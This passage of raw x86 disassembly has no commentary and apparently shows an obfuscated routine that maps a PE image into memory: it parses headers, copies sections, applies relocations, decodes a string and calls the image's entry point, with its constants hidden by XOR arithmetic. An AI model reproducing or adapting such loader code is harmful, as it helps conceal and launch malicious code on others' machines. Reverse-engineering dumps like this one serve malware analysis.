  4275f4:	cmp    eax,DWORD PTR [ebp-0xc]
  4275f7:	jne    0x42761c
  4275f9:	mov    eax,DWORD PTR [ebp-0x8]
  4275fc:	mov    ecx,DWORD PTR [ebp-0x20]
  4275ff:	xor    eax,esi
  427601:	xor    ecx,esi
  427603:	lea    ebx,[ebx+eax*1+0x3272f5]
  42760a:	mov    eax,DWORD PTR [ebp+0x10]
  42760d:	mov    eax,DWORD PTR [eax+0x1e0]
  427613:	add    ecx,edi
  427615:	imul   ecx,ebx
  427618:	push   ecx
  427619:	call   DWORD PTR [eax+0x24]
  42761c:	mov    eax,DWORD PTR [ebp-0x4]
  42761f:	xor    eax,esi
  427621:	add    eax,edi
  427623:	cmp    eax,DWORD PTR [ebp-0xc]
  427626:	jne    0x427637
  427628:	mov    eax,DWORD PTR [ebp-0x28]
  42762b:	xor    eax,esi
  42762d:	add    eax,edi
  42762f:	cmp    ebx,eax
  427631:	jbe    0x4275b1
  427637:	mov    eax,DWORD PTR [ebp-0x4]
  42763a:	xor    eax,esi
  42763c:	add    eax,edi
  42763e:	cmp    eax,DWORD PTR [ebp-0xc]
  427641:	jne    0x42765a
  427643:	mov    eax,DWORD PTR [ebp-0x8]
  427646:	mov    ecx,DWORD PTR [ebp-0x18]
  427649:	xor    eax,esi
  42764b:	lea    eax,[ecx+eax*1+0x3272f5]
  427652:	mov    DWORD PTR [ebp-0x18],eax
  427655:	jmp    0x427749
  42765a:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427661:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  427668:	mov    ebx,DWORD PTR [ebp-0x4]
  42766b:	xor    ebx,esi
  42766d:	add    ebx,edi
  42766f:	jmp    0x427736
  427674:	mov    eax,DWORD PTR [ebp-0x4]
  427677:	xor    eax,esi
  427679:	add    eax,edi
  42767b:	mov    DWORD PTR [ebp-0x14],eax
  42767e:	mov    eax,DWORD PTR [ebp-0x4]
  427681:	xor    eax,esi
  427683:	add    eax,edi
  427685:	mov    DWORD PTR [ebp+0xc],eax
  427688:	mov    ecx,DWORD PTR [ebp-0x4]
  42768b:	mov    eax,DWORD PTR [ebp-0x24]
  42768e:	xor    ecx,esi
  427690:	add    ecx,edi
  427692:	cmp    ecx,eax
  427694:	je     0x42769c
  427696:	mov    eax,DWORD PTR [eax+ebx*4]
  427699:	mov    DWORD PTR [ebp-0x14],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x1c]
  42769f:	mov    eax,DWORD PTR [eax+ebx*4]
  4276a2:	mov    DWORD PTR [ebp+0xc],eax
  4276a5:	mov    eax,DWORD PTR [ebp-0x4]
  4276a8:	mov    ecx,DWORD PTR [ebp-0x14]
  4276ab:	xor    eax,esi
  4276ad:	add    eax,edi
  4276af:	cmp    eax,ecx
  4276b1:	je     0x4276dc
  4276b3:	mov    eax,DWORD PTR [ebp-0x4]
  4276b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4276b9:	xor    eax,esi
  4276bb:	add    eax,edi
  4276bd:	shr    ecx,0x1f
  4276c0:	cmp    eax,ecx
  4276c2:	je     0x4276dc
  4276c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4276c7:	mov    eax,DWORD PTR [ebp+0x10]
  4276ca:	mov    eax,DWORD PTR [eax+0x1e0]
  4276d0:	movzx  ecx,cx
  4276d3:	push   ecx
  4276d4:	push   DWORD PTR [ebp-0xc]
  4276d7:	call   DWORD PTR [eax+0x8]
  4276da:	jmp    0x4276f5
  4276dc:	mov    eax,DWORD PTR [ebp+0xc]
  4276df:	add    eax,DWORD PTR [ebp+0x8]
  4276e2:	mov    ecx,DWORD PTR [ebp+0x10]
  4276e5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4276eb:	add    eax,0x2
  4276ee:	push   eax
  4276ef:	push   DWORD PTR [ebp-0xc]
  4276f2:	call   DWORD PTR [ecx+0x8]
  4276f5:	mov    DWORD PTR [ebp+0xc],eax
  4276f8:	mov    eax,DWORD PTR [ebp-0x4]
  4276fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4276fe:	xor    eax,esi
  427700:	add    eax,edi
  427702:	cmp    eax,ecx
  427704:	mov    eax,DWORD PTR [ebp-0x8]
  427707:	jne    0x42771a
  427709:	mov    ecx,DWORD PTR [ebp-0x18]
  42770c:	xor    eax,esi
  42770e:	lea    eax,[ecx+eax*1+0x3272f5]
  427715:	mov    DWORD PTR [ebp-0x18],eax
  427718:	jmp    0x42772a
  42771a:	mov    ecx,DWORD PTR [ebp+0xc]
  42771d:	xor    eax,esi
  42771f:	add    eax,edi
  427721:	imul   eax,ecx
  427724:	mov    ecx,DWORD PTR [ebp-0x1c]
  427727:	mov    DWORD PTR [ecx+ebx*4],eax
  42772a:	mov    eax,DWORD PTR [ebp-0x8]
  42772d:	xor    eax,esi
  42772f:	lea    ebx,[ebx+eax*1+0x3272f5]
  427736:	mov    eax,DWORD PTR [ebp-0x4]
  427739:	mov    ecx,DWORD PTR [ebp-0x1c]
  42773c:	xor    eax,esi
  42773e:	add    eax,edi
  427740:	cmp    DWORD PTR [ecx+ebx*4],eax
  427743:	jne    0x427674
  427749:	mov    edx,DWORD PTR [ebp-0x10]
  42774c:	mov    eax,DWORD PTR [ebp-0x18]
  42774f:	mov    ecx,DWORD PTR [ebp-0x2c]
  427752:	sub    edx,0x3272f4
  427758:	xor    edx,esi
  42775a:	jmp    0x427524
  42775f:	mov    ecx,DWORD PTR [ebp-0x4]
  427762:	xor    ecx,esi
  427764:	add    ecx,edi
  427766:	cmp    eax,ecx
  427768:	mov    eax,DWORD PTR [ebp-0x4]
  42776b:	jne    0x427775
  42776d:	mov    eax,DWORD PTR [ebp-0x8]
  427770:	jmp    0x427775
  427772:	mov    eax,DWORD PTR [ebp-0x4]
  427775:	xor    eax,esi
  427777:	add    eax,edi
  427779:	pop    edi
  42777a:	pop    esi
  42777b:	pop    ebx
  42777c:	leave  
  42777d:	ret    0xc
  427780:	push   ebp
  427781:	mov    ebp,esp
  427783:	sub    esp,0x28
  427786:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42778d:	mov    DWORD PTR [ebp-0x28],0xf89c85a2
  427794:	mov    eax,DWORD PTR [ebp+0xc]
  427797:	mov    DWORD PTR [ebp+0xc],eax
  42779a:	push   esi
  42779b:	mov    eax,eax
  42779d:	mov    eax,DWORD PTR [ebp-0x4]
  4277a0:	mov    esi,DWORD PTR [ebp+0x8]
  4277a3:	mov    ecx,0x75108ae
  4277a8:	xor    eax,ecx
  4277aa:	mov    edx,0x3272f5
  4277af:	add    eax,edx
  4277b1:	cmp    esi,eax
  4277b3:	je     0x4278da
  4277b9:	mov    eax,DWORD PTR [ebp+0x8]
  4277bc:	mov    esi,DWORD PTR [ebp+0x8]
  4277bf:	add    esi,DWORD PTR [eax+0x3c]
  4277c2:	push   edi
  4277c3:	mov    DWORD PTR [ebp+0xc],esi
  4277c6:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  4277cd:	mov    eax,DWORD PTR [ebp-0x1c]
  4277d0:	mov    esi,DWORD PTR [ebp-0x4]
  4277d3:	mov    edi,DWORD PTR [ebp+0xc]
  4277d6:	xor    esi,ecx
  4277d8:	xor    eax,ecx
  4277da:	add    esi,edx
  4277dc:	cmp    DWORD PTR [edi+eax*8+0x1939820],esi
  4277e3:	je     0x4278d4
  4277e9:	mov    esi,DWORD PTR [ebp+0xc]
  4277ec:	mov    eax,DWORD PTR [ebp+0x8]
  4277ef:	add    eax,DWORD PTR [esi+0xa0]
  4277f5:	mov    esi,DWORD PTR [ebp+0x8]
  4277f8:	mov    edi,DWORD PTR [ebp+0xc]
  4277fb:	sub    esi,DWORD PTR [edi+0x34]
  4277fe:	mov    edi,DWORD PTR [ebp-0x4]
  427801:	xor    edi,ecx
  427803:	add    edi,edx
  427805:	mov    DWORD PTR [ebp-0x24],esi
  427808:	cmp    esi,edi
  42780a:	je     0x4278d4
  427810:	mov    esi,DWORD PTR [ebp-0x4]
  427813:	xor    esi,ecx
  427815:	add    esi,edx
  427817:	mov    DWORD PTR [ebp-0x8],esi
  42781a:	push   ebx
  42781b:	mov    DWORD PTR [ebp-0x10],0xf89c85a0
  427822:	jmp    0x4278be
  427827:	mov    esi,DWORD PTR [ebp-0x4]
  42782a:	xor    esi,ecx
  42782c:	lea    edi,[ebx-0x8]
  42782f:	add    esi,edx
  427831:	shr    edi,1
  427833:	cmp    esi,edi
  427835:	jae    0x4278a4
  427837:	sub    edi,esi
  427839:	lea    ebx,[eax+esi*2+0x8]
  42783d:	mov    DWORD PTR [ebp-0x18],edi
  427840:	movzx  esi,WORD PTR [ebx]
  427843:	and    esi,0xfff
  427849:	mov    DWORD PTR [ebp-0x14],esi
  42784c:	mov    edi,DWORD PTR [ebp-0x14]
  42784f:	mov    esi,DWORD PTR [eax]
  427851:	sub    esi,edx
  427853:	add    edi,esi
  427855:	movzx  esi,WORD PTR [ebx]
  427858:	shr    esi,0xc
  42785b:	xor    edi,ecx
  42785d:	mov    DWORD PTR [ebp-0x20],edi
  427860:	mov    DWORD PTR [ebp-0x14],esi
  427863:	mov    esi,DWORD PTR [ebp-0x20]
  427866:	mov    edi,DWORD PTR [ebp+0x8]
  427869:	xor    esi,ecx
  42786b:	lea    esi,[esi+edi*1+0x3272f5]
  427872:	mov    DWORD PTR [ebp-0x20],esi
  427875:	mov    esi,DWORD PTR [ebp-0x10]
  427878:	mov    edi,DWORD PTR [ebp-0x14]
  42787b:	xor    esi,ecx
  42787d:	add    esi,edx
  42787f:	cmp    edi,esi
  427881:	jne    0x427899
  427883:	mov    esi,DWORD PTR [ebp-0x10]
  427886:	mov    edi,DWORD PTR [ebp-0x14]
  427889:	xor    esi,ecx
  42788b:	add    esi,edx
  42788d:	cmp    edi,esi
  42788f:	jne    0x427899
  427891:	mov    esi,DWORD PTR [ebp-0x20]
  427894:	mov    edi,DWORD PTR [ebp-0x24]
  427897:	add    DWORD PTR [esi],edi
  427899:	add    ebx,0x2
  42789c:	dec    DWORD PTR [ebp-0x18]
  42789f:	jne    0x427840
  4278a1:	mov    ebx,DWORD PTR [ebp-0xc]
  4278a4:	add    DWORD PTR [ebp-0x8],ebx
  4278a7:	mov    esi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    edi,DWORD PTR [ebp-0x8]
  4278ad:	mov    ebx,DWORD PTR [ebp+0xc]
  4278b0:	xor    esi,ecx
  4278b2:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939824]
  4278b9:	jae    0x4278d3
  4278bb:	add    eax,DWORD PTR [ebp-0xc]
  4278be:	mov    esi,DWORD PTR [ebp-0x4]
  4278c1:	mov    ebx,DWORD PTR [eax+0x4]
  4278c4:	xor    esi,ecx
  4278c6:	add    esi,edx
  4278c8:	mov    DWORD PTR [ebp-0xc],ebx
  4278cb:	cmp    ebx,esi
  4278cd:	jne    0x427827
  4278d3:	pop    ebx
  4278d4:	mov    eax,DWORD PTR [ebp-0x28]
  4278d7:	pop    edi
  4278d8:	jmp    0x4278dd
  4278da:	mov    eax,DWORD PTR [ebp-0x4]
  4278dd:	xor    eax,ecx
  4278df:	add    eax,edx
  4278e1:	pop    esi
  4278e2:	leave  
  4278e3:	ret    0x8
  4278e6:	push   ebp
  4278e7:	mov    ebp,esp
  4278e9:	sub    esp,0xd8
  4278ef:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4278f6:	mov    DWORD PTR [ebp-0x24],0xf89c85a2
  4278fd:	mov    eax,DWORD PTR [ebp-0x4]
  427900:	push   ebx
  427901:	push   esi
  427902:	mov    esi,0x75108ae
  427907:	xor    eax,esi
  427909:	push   edi
  42790a:	mov    edi,0x3272f5
  42790f:	add    eax,edi
  427911:	mov    DWORD PTR [ebp-0x18],eax
  427914:	mov    eax,DWORD PTR [ebp-0x4]
  427917:	xor    eax,esi
  427919:	add    eax,edi
  42791b:	mov    DWORD PTR [ebp-0x8],eax
  42791e:	mov    ebx,DWORD PTR [ebp+0x20]
  427921:	mov    eax,DWORD PTR [ebp-0x1c]
  427924:	mov    ecx,DWORD PTR [ebp-0x1c]
  427927:	xor    eax,ecx
  427929:	mov    DWORD PTR [ebp-0x1c],eax
  42792c:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427933:	mov    eax,DWORD PTR [ebp-0xc]
  427936:	mov    ecx,DWORD PTR [ebp-0xc]
  427939:	xor    eax,ecx
  42793b:	mov    DWORD PTR [ebp-0xc],eax
  42793e:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427945:	mov    eax,DWORD PTR [ebp-0x10]
  427948:	mov    ecx,DWORD PTR [ebp-0x10]
  42794b:	xor    eax,ecx
  42794d:	mov    DWORD PTR [ebp-0x10],eax
  427950:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  427957:	mov    eax,DWORD PTR [ebp-0x28]
  42795a:	mov    ecx,DWORD PTR [ebp-0x28]
  42795d:	xor    eax,ecx
  42795f:	mov    DWORD PTR [ebp-0x28],eax
  427962:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  427969:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  427970:	mov    eax,DWORD PTR [ebp+0x8]
  427973:	test   eax,eax
  427975:	je     0x427dfc
  42797b:	mov    eax,DWORD PTR [ebp+0xc]
  42797e:	test   eax,eax
  427980:	je     0x427dfc
  427986:	mov    eax,DWORD PTR [ebp+0x18]
  427989:	test   eax,eax
  42798b:	je     0x427dfc
  427991:	mov    eax,DWORD PTR [ebp+0x20]
  427994:	mov    ecx,DWORD PTR [ebp+0x8]
  427997:	xor    eax,0x8ae
  42799c:	add    eax,0x72f5
  4279a1:	cmp    WORD PTR [ecx],ax
  4279a4:	jne    0x427dfc
  4279aa:	mov    eax,DWORD PTR [ebp-0x4]
  4279ad:	xor    eax,esi
  4279af:	add    eax,edi
  4279b1:	mov    DWORD PTR [ebp-0x30],eax
  4279b4:	mov    eax,DWORD PTR [ebp-0x4]
  4279b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4279ba:	mov    eax,DWORD PTR [ebp+0x8]
  4279bd:	add    eax,DWORD PTR [ecx+0x3c]
  4279c0:	mov    DWORD PTR [ebp+0xc],eax
  4279c3:	mov    eax,DWORD PTR [eax+0x50]
  4279c6:	test   eax,eax
  4279c8:	je     0x427dfc
  4279ce:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  4279d5:	mov    eax,DWORD PTR [ebp-0x2c]
  4279d8:	xor    eax,esi
  4279da:	add    eax,edi
  4279dc:	mov    DWORD PTR [ebp-0x2c],eax
  4279df:	mov    eax,DWORD PTR [ebp-0x4]
  4279e2:	mov    eax,DWORD PTR [ebx+0x190]
  4279e8:	mov    ecx,DWORD PTR [eax]
  4279ea:	mov    ecx,DWORD PTR [ecx+0x3c]
  4279ed:	add    ecx,DWORD PTR [eax]
  4279ef:	mov    eax,DWORD PTR [ebp-0x4]
  4279f2:	mov    eax,DWORD PTR [ebx+0x18c]
  4279f8:	mov    edx,DWORD PTR [eax]
  4279fa:	mov    DWORD PTR [ebp-0x20],ecx
  4279fd:	mov    DWORD PTR [ebp+0x20],edx
  427a00:	cmp    edx,edx
  427a02:	jne    0x427a36
  427a04:	mov    eax,DWORD PTR [ebx+0x1e0]
  427a0a:	lea    edx,[ebp-0x18]
  427a0d:	push   edx
  427a0e:	mov    edx,DWORD PTR [ebp-0xc]
  427a11:	xor    edx,esi
  427a13:	add    edx,edi
  427a15:	push   edx
  427a16:	push   DWORD PTR [ecx+0x50]
  427a19:	push   DWORD PTR [ebp+0x20]
  427a1c:	call   DWORD PTR [eax+0x1c]
  427a1f:	mov    eax,DWORD PTR [ebp-0x20]
  427a22:	mov    ecx,DWORD PTR [eax+0x54]
  427a25:	mov    eax,DWORD PTR [eax+0x50]
  427a28:	sub    eax,ecx
  427a2a:	add    ecx,DWORD PTR [ebp+0x20]
  427a2d:	push   ecx
  427a2e:	call   0x428399
  427a33:	mov    edx,DWORD PTR [ebp+0x20]
  427a36:	mov    eax,DWORD PTR [ebx+0x194]
  427a3c:	mov    DWORD PTR [eax],edx
  427a3e:	mov    eax,DWORD PTR [ebp+0xc]
  427a41:	push   DWORD PTR [eax+0x54]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	push   edx
  427a48:	call   0x42828f
  427a4d:	mov    ecx,DWORD PTR [ebp+0x20]
  427a50:	mov    eax,DWORD PTR [ecx+0x3c]
  427a53:	add    eax,ecx
  427a55:	movzx  ecx,WORD PTR [eax+0x14]
  427a59:	lea    ecx,[ecx+eax*1+0x18]
  427a5d:	mov    DWORD PTR [ebp+0x18],ecx
  427a60:	mov    ecx,DWORD PTR [ebp-0x4]
  427a63:	movzx  edx,WORD PTR [eax+0x6]
  427a67:	xor    ecx,esi
  427a69:	add    ecx,edi
  427a6b:	mov    DWORD PTR [ebp+0xc],eax
  427a6e:	cmp    edx,ecx
  427a70:	je     0x427b1d
  427a76:	mov    ecx,DWORD PTR [ebp-0x4]
  427a79:	xor    ecx,esi
  427a7b:	add    ecx,edi
  427a7d:	mov    DWORD PTR [ebp-0x8],ecx
  427a80:	mov    ecx,DWORD PTR [ebp-0x24]
  427a83:	movzx  edx,WORD PTR [eax+0x6]
  427a87:	xor    ecx,esi
  427a89:	sub    edx,ecx
  427a8b:	sub    edx,edi
  427a8d:	cmp    DWORD PTR [ebp-0x8],edx
  427a90:	ja     0x427b1d
  427a96:	mov    edx,DWORD PTR [ebp+0x18]
  427a99:	add    edx,0x8
  427a9c:	mov    DWORD PTR [ebp+0x18],edx
  427a9f:	jmp    0x427aa4
  427aa1:	mov    edx,DWORD PTR [ebp+0x18]
  427aa4:	mov    eax,DWORD PTR [eax+0x38]
  427aa7:	lea    ecx,[eax-0x1]
  427aaa:	mov    DWORD PTR [ebp-0x38],eax
  427aad:	mov    eax,DWORD PTR [edx]
  427aaf:	test   eax,ecx
  427ab1:	je     0x427aba
  427ab3:	not    ecx
  427ab5:	and    eax,ecx
  427ab7:	add    eax,DWORD PTR [ebp-0x38]
  427aba:	mov    ecx,DWORD PTR [edx+0x4]
  427abd:	add    ecx,DWORD PTR [ebp+0x20]
  427ac0:	push   ecx
  427ac1:	call   0x428399
  427ac6:	mov    edx,DWORD PTR [ebp-0x4]
  427ac9:	mov    eax,DWORD PTR [ebp+0x18]
  427acc:	mov    ecx,DWORD PTR [eax+0x8]
  427acf:	xor    edx,esi
  427ad1:	add    edx,edi
  427ad3:	cmp    ecx,edx
  427ad5:	je     0x427aee
  427ad7:	push   ecx
  427ad8:	mov    ecx,DWORD PTR [ebp+0x8]
  427adb:	add    ecx,DWORD PTR [eax+0xc]
  427ade:	mov    eax,DWORD PTR [eax+0x4]
  427ae1:	add    eax,DWORD PTR [ebp+0x20]
  427ae4:	push   ecx
  427ae5:	push   eax
  427ae6:	call   0x42828f
  427aeb:	mov    eax,DWORD PTR [ebp+0x18]
  427aee:	mov    ecx,DWORD PTR [ebp-0x24]
  427af1:	mov    edx,DWORD PTR [ebp-0x8]
  427af4:	add    eax,0x28
  427af7:	xor    ecx,esi
  427af9:	lea    ecx,[edx+ecx*1+0x3272f5]
  427b00:	mov    edx,DWORD PTR [ebp+0xc]
  427b03:	mov    DWORD PTR [ebp+0x18],eax
  427b06:	mov    eax,DWORD PTR [ebp-0x24]
  427b09:	movzx  edx,WORD PTR [edx+0x6]
  427b0d:	xor    eax,esi
  427b0f:	sub    edx,eax
  427b11:	mov    eax,DWORD PTR [ebp+0xc]
  427b14:	sub    edx,edi
  427b16:	mov    DWORD PTR [ebp-0x8],ecx
  427b19:	cmp    ecx,edx
  427b1b:	jbe    0x427aa1
  427b1d:	mov    edx,DWORD PTR [ebx+0x18c]
  427b23:	mov    ecx,DWORD PTR [ebp+0x20]
  427b26:	cmp    ecx,DWORD PTR [edx]
  427b28:	jne    0x427b51
  427b2a:	mov    eax,DWORD PTR [ebx+0x1e0]
  427b30:	lea    edx,[ebp-0x18]
  427b33:	push   edx
  427b34:	mov    edx,DWORD PTR [ebp-0x10]
  427b37:	xor    edx,esi
  427b39:	add    edx,edi
  427b3b:	push   edx
  427b3c:	mov    edx,DWORD PTR [ebp-0x20]
  427b3f:	push   DWORD PTR [edx+0x54]
  427b42:	push   ecx
  427b43:	call   DWORD PTR [eax+0x1c]
  427b46:	test   eax,eax
  427b48:	je     0x427ded
  427b4e:	mov    eax,DWORD PTR [ebp+0xc]
  427b51:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427b57:	mov    ecx,DWORD PTR [ecx]
  427b59:	xor    ecx,esi
  427b5b:	add    ecx,edi
  427b5d:	je     0x427d18
  427b63:	mov    eax,DWORD PTR [ebp-0x4]
  427b66:	xor    eax,esi
  427b68:	add    eax,edi
  427b6a:	and    DWORD PTR [ebp+0x8],0x0
  427b6e:	mov    DWORD PTR [ebp-0x14],eax
  427b71:	mov    eax,0xf89c85c1
  427b76:	lea    ecx,[eax+0x18]
  427b79:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  427b80:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  427b87:	mov    DWORD PTR [ebp-0x50],eax
  427b8a:	mov    DWORD PTR [ebp-0x4c],ecx
  427b8d:	mov    DWORD PTR [ebp-0x48],ecx
  427b90:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  427b97:	mov    edx,DWORD PTR [ebp+0x8]
  427b9a:	mov    ecx,0x8ae
  427b9f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  427ba4:	mov    edx,0x72f5
  427ba9:	add    cx,dx
  427bac:	mov    edx,DWORD PTR [ebp+0x8]
  427baf:	inc    DWORD PTR [ebp+0x8]
  427bb2:	cmp    DWORD PTR [ebp+0x8],0x6
  427bb6:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  427bbe:	jb     0x427b97
  427bc0:	mov    ecx,0xf89c85d3
  427bc5:	mov    DWORD PTR [ebp-0xb0],eax
  427bcb:	mov    DWORD PTR [ebp-0x9c],eax
  427bd1:	mov    DWORD PTR [ebp-0x74],eax
  427bd4:	mov    DWORD PTR [ebp-0x70],eax
  427bd7:	lea    eax,[ecx-0x3]
  427bda:	lea    edx,[ecx+0x2c]
  427bdd:	mov    DWORD PTR [ebp-0x64],eax
  427be0:	mov    DWORD PTR [ebp-0x60],eax
  427be3:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  427bed:	mov    DWORD PTR [ebp-0xac],ecx
  427bf3:	mov    DWORD PTR [ebp-0xa8],edx
  427bf9:	mov    DWORD PTR [ebp-0xa4],0xf89c85da
  427c03:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427c0d:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  427c17:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427c21:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  427c2b:	mov    DWORD PTR [ebp-0x8c],ecx
  427c31:	mov    DWORD PTR [ebp-0x88],0xf89c852a
  427c3b:	mov    DWORD PTR [ebp-0x84],edx
  427c41:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  427c48:	mov    DWORD PTR [ebp-0x7c],ecx
  427c4b:	mov    DWORD PTR [ebp-0x78],0xf89c85e2
  427c52:	mov    DWORD PTR [ebp-0x6c],ecx
  427c55:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427c5c:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427c63:	xor    eax,eax
  427c65:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  427c6c:	xor    cl,0xae
  427c6f:	sub    cl,0xb
  427c72:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  427c79:	inc    eax
  427c7a:	cmp    eax,0x17
  427c7d:	jb     0x427c65
  427c7f:	mov    eax,DWORD PTR [ebx+0x1e0]
  427c85:	lea    ecx,[ebp-0xc0]
  427c8b:	push   ecx
  427c8c:	call   DWORD PTR [eax+0x4]
  427c8f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  427c95:	lea    edx,[ebp-0xd8]
  427c9b:	push   edx
  427c9c:	push   eax
  427c9d:	call   DWORD PTR [ecx+0x8]
  427ca0:	mov    DWORD PTR [ebp-0x40],eax
  427ca3:	lea    eax,[ebp-0x14]
  427ca6:	push   eax
  427ca7:	mov    eax,DWORD PTR [ebx+0x18c]
  427cad:	push   DWORD PTR [eax]
  427caf:	mov    eax,DWORD PTR [ebp-0x40]
  427cb2:	call   eax
  427cb4:	mov    eax,DWORD PTR [ebp-0x4]
  427cb7:	xor    eax,esi
  427cb9:	add    eax,edi
  427cbb:	mov    DWORD PTR [ebp-0x34],eax
  427cbe:	mov    ecx,DWORD PTR [ebp-0x4]
  427cc1:	mov    eax,DWORD PTR [ebp-0x14]
  427cc4:	xor    ecx,esi
  427cc6:	add    ecx,edi
  427cc8:	cmp    eax,ecx
  427cca:	je     0x427d15
  427ccc:	mov    DWORD PTR [ebp-0x3c],eax
  427ccf:	jmp    0x427ce0
  427cd1:	mov    eax,DWORD PTR [eax]
  427cd3:	mov    ecx,DWORD PTR [ebp-0x3c]
  427cd6:	mov    DWORD PTR [ebp-0x14],eax
  427cd9:	mov    eax,DWORD PTR [ebp-0x14]
  427cdc:	cmp    eax,ecx
  427cde:	je     0x427ced
  427ce0:	mov    edx,DWORD PTR [eax+0x18]
  427ce3:	mov    ecx,DWORD PTR [ebx+0x18c]
  427ce9:	cmp    edx,DWORD PTR [ecx]
  427ceb:	jne    0x427cd1
  427ced:	mov    ecx,DWORD PTR [ebx+0x18c]
  427cf3:	mov    edx,DWORD PTR [eax+0x18]
  427cf6:	cmp    edx,DWORD PTR [ecx]
  427cf8:	jne    0x427d15
  427cfa:	mov    ecx,DWORD PTR [ebx+0x190]
  427d00:	mov    edx,DWORD PTR [ebp-0x20]
  427d03:	mov    edx,DWORD PTR [edx+0x28]
  427d06:	add    edx,DWORD PTR [ecx]
  427d08:	mov    DWORD PTR [eax+0x1c],edx
  427d0b:	mov    eax,DWORD PTR [ebp-0x24]
  427d0e:	xor    eax,esi
  427d10:	add    eax,edi
  427d12:	mov    DWORD PTR [ebp-0x34],eax
  427d15:	mov    eax,DWORD PTR [ebp+0xc]
  427d18:	push   ebx
  427d19:	push   eax
  427d1a:	push   DWORD PTR [ebp+0x20]
  427d1d:	call   0x42749d
  427d22:	test   eax,eax
  427d24:	je     0x427ded
  427d2a:	push   DWORD PTR [ebp+0xc]
  427d2d:	mov    ecx,ebx
  427d2f:	push   DWORD PTR [ebp+0x20]
  427d32:	call   0x4273f6
  427d37:	test   eax,eax
  427d39:	je     0x427ded
  427d3f:	mov    eax,DWORD PTR [ebp+0xc]
  427d42:	mov    edx,DWORD PTR [ebp+0x20]
  427d45:	mov    ecx,ebx
  427d47:	call   0x4272cf
  427d4c:	test   eax,eax
  427d4e:	je     0x427ded
  427d54:	push   ebx
  427d55:	push   DWORD PTR [ebp+0x20]
  427d58:	call   0x427780
  427d5d:	test   eax,eax
  427d5f:	je     0x427ded
  427d65:	mov    eax,DWORD PTR [ebx+0x18c]
  427d6b:	mov    edx,DWORD PTR [ebp+0x20]
  427d6e:	cmp    edx,DWORD PTR [eax]
  427d70:	jne    0x427d8c
  427d72:	mov    eax,DWORD PTR [ebx+0x1e0]
  427d78:	lea    ecx,[ebp-0x18]
  427d7b:	push   ecx
  427d7c:	push   DWORD PTR [ebp-0x18]
  427d7f:	mov    ecx,DWORD PTR [ebp-0x20]
  427d82:	push   DWORD PTR [ecx+0x54]
  427d85:	push   edx
  427d86:	call   DWORD PTR [eax+0x1c]
  427d89:	mov    edx,DWORD PTR [ebp+0x20]
  427d8c:	mov    eax,DWORD PTR [ebx+0x1c8]
  427d92:	mov    eax,DWORD PTR [eax]
  427d94:	xor    eax,esi
  427d96:	add    eax,edi
  427d98:	je     0x427dd1
  427d9a:	mov    ecx,DWORD PTR [ebp+0xc]
  427d9d:	mov    eax,DWORD PTR [ecx+0x28]
  427da0:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  427da7:	mov    esi,DWORD PTR [ebp+0x8]
  427daa:	push   DWORD PTR [ebp+0x14]
  427dad:	xor    esi,0x8ae
  427db3:	push   DWORD PTR [ebp+0x10]
  427db6:	add    esi,0x72f5
  427dbc:	or     WORD PTR [ecx+0x16],si
  427dc0:	add    eax,edx
  427dc2:	push   edx
  427dc3:	call   eax
  427dc5:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a2
  427dcf:	jmp    0x427ddb
  427dd1:	mov    eax,DWORD PTR [ebp+0xc]
  427dd4:	mov    eax,DWORD PTR [eax+0x28]
  427dd7:	add    eax,edx
  427dd9:	call   eax
  427ddb:	mov    DWORD PTR [ebp-0x8],eax
  427dde:	mov    eax,DWORD PTR [ebp-0x8]
  427de1:	mov    ecx,DWORD PTR [ebp+0x1c]
  427de4:	mov    DWORD PTR [ecx],eax
  427de6:	mov    DWORD PTR [ebp-0x30],0x1
  427ded:	cmp    DWORD PTR [ebp-0x30],0x0
  427df1:	jne    0x427df7
  427df3:	and    DWORD PTR [ebp+0x20],0x0
  427df7:	mov    eax,DWORD PTR [ebp+0x20]
  427dfa:	jmp    0x427dfe
  427dfc:	xor    eax,eax
  427dfe:	pop    edi
  427dff:	pop    esi
  427e00:	pop    ebx
  427e01:	leave  
  427e02:	ret    0x1c
  427e05:	push   ebp
  427e06:	mov    ebp,esp
  427e08:	movzx  edx,WORD PTR [ecx+0x6]
  427e0c:	movzx  eax,WORD PTR [ecx+0x14]
  427e10:	push   ebx
  427e11:	push   edi
  427e12:	xor    edi,edi
  427e14:	lea    eax,[eax+ecx*1+0x18]
  427e18:	test   edx,edx
  427e1a:	je     0x427e3b
  427e1c:	mov    ecx,DWORD PTR [eax+0xc]
